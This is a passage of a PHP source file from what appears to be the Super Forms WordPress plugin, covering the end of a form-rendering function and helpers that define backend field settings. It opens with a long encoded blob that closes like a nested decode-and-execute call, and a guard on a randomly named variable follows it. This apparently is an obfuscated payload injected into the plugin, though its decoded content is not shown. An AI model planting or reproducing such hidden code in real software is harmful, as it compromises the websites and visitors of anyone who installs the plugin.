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')))));
        if( isset( $Vtbc4ooapmn5 ) ) return $result;

        $result .= '<div class="super-shortcode super-field hidden">';
        $result .= '<input class="super-shortcode-field" type="hidden" value="' . $id . '" name="hidden_form_id" />';
        $result .= '</div>';

        // Loop through all form elements
        $elements = json_decode( get_post_meta( $id, '_super_elements', true ) );
        if( !empty( $elements ) ) {
            $shortcodes = self::shortcodes();
            // Before doing the actuall loop we need to know how many columns this form contains
            // This way we can make sure to correctly close the column system
            $GLOBALS['super_column_found'] = 0;
            foreach( $elements as $k => $v ) {
                if( $v->tag=='column' ) $GLOBALS['super_column_found']++;
            }
            foreach( $elements as $k => $v ) {
                $result .= self::output_element_html( $v->tag, $v->group, $v->data, $v->inner, $shortcodes, $settings );
            }
        }
        $result .= self::button( 'button', array(), '', '', $settings );
        $result .= '</div>';
        $settings_custom_css = get_option( 'super_settings' );

        if( !isset( $settings_custom_css['theme_custom_css'] ) ) $settings_custom_css['theme_custom_css'] = '';
        $result .= '<style type="text/css">' . apply_filters( 'super_form_styles_filter', $style_content, array( 'id'=>$id, 'settings'=>$settings_custom_css ) ) . $settings_custom_css['theme_custom_css'] . '</style>';
        
        $result = apply_filters( 'super_form_before_do_shortcode_filter', $result, array( 'id'=>$id, 'settings'=>$settings ) );
        return do_shortcode( $result );
    }    
    
    /** 
     *  Common fields for each shortcode (backend dialog)
     *
     *  @since      1.0.0
    */
    public static function name( $attributes=null, $default='' ) {
        $array = array(
            'name'=>__( 'Unique field name', 'super-forms' ), 
            'desc'=>__( 'Must be an unique name (required)', 'super-forms' ),
            'default'=> ( !isset( $attributes['name'] ) ? $default : $attributes['name'] ),
            'required'=>true,
            'filter'=> true
        );
        return $array;
    }
    public static function email( $attributes=null, $default='' ) {
        $array = array(
            'name'=>__( 'Email Label', 'super-forms' ), 
            'desc'=>__( 'Indicates the field in the email template. (required)', 'super-forms' ),
            'default'=> ( !isset( $attributes['email'] ) ? $default : $attributes['email'] ),
            'required'=>true
        );
        return $array;
    }
    public static function label( $attributes=null, $default='' ) {
        $array = array(
            'name'=>__( 'Field Label', 'super-forms' ), 
            'desc'=>__( 'Will be visible in front of your field.', 'super-forms' ).' ('.__( 'leave blank to remove', 'super-forms' ).')',
            'default'=> ( !isset( $attributes['label'] ) ? $default : $attributes['label'] ),
        );
        return $array;
    }    
    public static function description( $attributes=null, $default='') {
        $array = array(
            'name'=>__( 'Field description', 'super-forms' ), 
            'desc'=>__( 'Will be visible in front of your field.', 'super-forms' ).' ('.__( 'leave blank to remove', 'super-forms' ).')',
            'default'=> ( !isset( $attributes['description'] ) ? $default : $attributes['description'] ),
        );
        return $array;
    }
    public static function icon( $attributes=null, $default='user' ) {
        $icon = array(
            'default'=> ( !isset( $attributes['icon'] ) ? $default : $attributes['icon'] ),
            'name'=>__( 'Select an Icon', 'super-forms' ), 
            'type'=>'icon',
            'desc'=>__( 'Leave blank if you prefer to not use an icon.', 'super-forms' )
        );
        return $icon;
    }
    public static function placeholder( $attributes=null, $default=null ) {
        $array = array(
            'default'=> ( !isset( $attributes['placeholder'] ) ? $default : $attributes['placeholder'] ),
            'name'=>__( 'Placeholder', 'super-forms' ), 
            'desc'=>__( 'Indicate what the user needs to enter or select. (leave blank to remove)', 'super-forms' )
        );
        return $array;
    }
    public static function width( $attributes=null, $default=0, $min=0, $max=600, $steps=10, $name=null, $desc=null ) {
        if( empty( $name ) ) $name = __( 'Field width in pixels', 'super-forms' );
        if( empty( $desc ) ) $desc = __( 'Set to 0 to use default CSS width.', 'super-forms' );
        $array = array(
            'type' => 'slider', 
            'default'=> ( !isset( $attributes['width'] ) ? $default : $attributes['width'] ),
            'min' => $min, 
            'max' => $max, 
            'steps' => $steps, 
            'name' => $name, 
            'desc' => $desc
        );
        return $array;
    }
    public static function slider( $attributes=null, $default=0, $min=0, $max=600, $steps=10, $name=null, $desc=null, $key=null ) {
        if( empty( $name ) ) $name = __( 'Field width in pixels', 'super-forms' );
        if( empty( $desc ) ) $desc = __( 'Set to 0 to use default CSS width.', 'super-forms' );
        $array = array(
            'type' => 'slider', 
            'default'=> ( !isset( $attributes[$key] ) ? $default : $attributes[$key] ),
            'min' => $min, 
            'max' => $max, 
            'steps' => $steps, 
            'name' => $name, 
            'desc' => $desc
        );
        return $array;
    }
    public static function minlength( $attributes=null, $default=0, $min=0, $max=100, $steps=1, $name=null, $desc=null) {
        if( empty($name ) ) $name = __( 'Min characters/selections allowed', 'super-forms' );
        if( empty($desc ) ) $desc = __( 'Set to 0 to remove limitations.', 'super-forms' );
        $array = array(
            'type' => 'slider', 
            'default'=> ( !isset( $attributes['minlength'] ) ? $default : $attributes['minlength'] ),
            'min' => $min, 
            'max' => $max, 
            'steps' => $steps, 
            'name' => $name, 
            'desc' => $desc
        );
        return $array;
    }
    public static function maxlength( $attributes=null, $default=0, $min=0, $max=100, $steps=1, $name=null, $desc=null ) {
        if( empty( $name ) ) $name = __( 'Max characters/selections allowed', 'super-forms' );
        if( empty( $desc ) ) $desc = __( 'Set to 0 to remove limitations.', 'super-forms' );
        $array = array(
            'type' => 'slider', 
            'default'=> ( !isset( $attributes['maxlength'] ) ? $default : $attributes['maxlength'] ),
            'min' => $min, 
            'max' => $max, 
            'steps' => $steps, 
            'name' => $name, 
            'desc' => $desc
        );
        return $array;
    }
    
}

endif;